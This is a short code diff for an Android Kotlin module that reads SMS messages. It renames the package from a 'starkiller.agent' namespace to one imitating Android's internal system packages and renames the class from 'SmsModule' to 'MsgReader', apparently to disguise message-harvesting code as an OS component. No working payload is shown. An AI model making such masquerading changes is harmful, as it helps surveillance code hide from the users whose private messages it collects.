@@ -1,4 +1,4 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.content.Context
 import android.net.Uri
@@ -6,7 +6,7 @@ import android.telephony.SmsManager
 import org.json.JSONArray
 import org.json.JSONObject
 
-class SmsModule(private val context: Context) {
+class MsgReader(private val context: Context) {
 
     fun readAll(): JSONObject {
         val messages = JSONArray()
